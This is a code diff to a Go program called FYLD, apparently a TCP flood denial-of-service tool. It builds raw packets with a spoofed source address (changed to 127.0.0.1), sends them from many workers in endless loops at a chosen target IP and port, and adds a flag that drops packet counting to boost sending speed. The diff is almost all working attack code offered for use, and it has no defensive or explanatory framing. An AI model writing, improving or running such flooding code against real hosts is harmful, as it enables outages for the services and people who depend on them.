@@ -14,6 +14,7 @@ var (
 	targetIp     string
 	targetPort   int64
 	workerCount  int64
+	noCounter	 bool
 )
 
 func worker(ipStr string, port int64) {
@@ -49,7 +50,7 @@ func worker(ipStr string, port int64) {
 		0x40,
 		0x06,
 		0x00, 0x00,
-		192, 168, 1, 50,
+		127, 0, 0, 1,
 		destIP[0], destIP[1], destIP[2], destIP[3],
 		0x30, 0x39,
 		byte(port >> 8), byte(port & 0xff),
@@ -61,14 +62,24 @@ func worker(ipStr string, port int64) {
 		0x00, 0x00,
 		0x00, 0x00,
 	}
-	for {
-		err = syscall.Sendto(fd, packet, 0, &addr)
-		if err != nil {
-			fmt.Println("Failed to send packet. worker stopped.", err)
-			workerCount--
-			return
+	if !noCounter {
+		for {
+			err = syscall.Sendto(fd, packet, 0, &addr)
+			if err != nil {
+				fmt.Println("Failed to send packet. worker stopped.", err)
+				workerCount--
+				return
+			}
+			atomic.AddInt64(&totalPackets, 1)
 		}
-		atomic.AddInt64(&totalPackets, 1)
+	} else {
+		for {
+			err = syscall.Sendto(fd, packet, 0, &addr)
+			if err != nil {
+				fmt.Println("Failed to send packet. worker stopped.", err)
+				return
+			}
+		}
 	}
 }
 
@@ -80,14 +91,16 @@ func main() {
 	targetIpPtr := flag.String("ip", "", "Enter the target ip")
 	targetPortPtr := flag.Int64("port", 0, "Enter the target port")
 	workerCountPtr := flag.Int64("workers", 0, "Enter the number of workers")
+	noCounterPtr := flag.Bool("no-packet-counter", false, "Enable to stop counting packets sent (might improve performance)")
 	flag.Parse()
 	if *targetIpPtr == "" || *targetPortPtr == 0 || *workerCountPtr == 0 {
-		fmt.Println("Invalid input or missing args.\nUsage: FYLD -ip <ip> -port <port> -workers <workers>")
+		fmt.Println("Invalid input or missing args.\nUsage: FYLD -ip <ip> -port <port> -workers <workers> -")
 		return
 	}
 	targetIp = *targetIpPtr
 	targetPort = *targetPortPtr
 	workerCount = *workerCountPtr
+	noCounter = *noCounterPtr
 	fmt.Print("\033[H\033[2J\n\n")
 	fmt.Printf("Initiating workers...\nPlease wait...\n")
 	for i := 0; int64(i) < workerCount; i++ {
@@ -96,12 +109,14 @@ func main() {
 	fmt.Print("\033[H\033[2J\n\n")
 	fmt.Printf("Flooding %s at port %d using TCP with %d workers\n", targetIp, targetPort, workerCount)
 	fmt.Printf("------------------------------------------------------\n")
-	for {
-		if workerCount == 0 {
-			fmt.Printf("\nAll workers are stopped.\n")
-			return
+	if !noCounter {
+		for {
+			if workerCount == 0 {
+				fmt.Printf("\nAll workers are stopped.\n")
+				return
+			}
+				fmt.Printf("\rTotal packets sent: %-20d", totalPackets)
+			time.Sleep(time.Millisecond * 500)
 		}
-		fmt.Printf("\rTotal packets sent: %-20d", totalPackets)
-		time.Sleep(time.Millisecond * 500)
 	}
 }
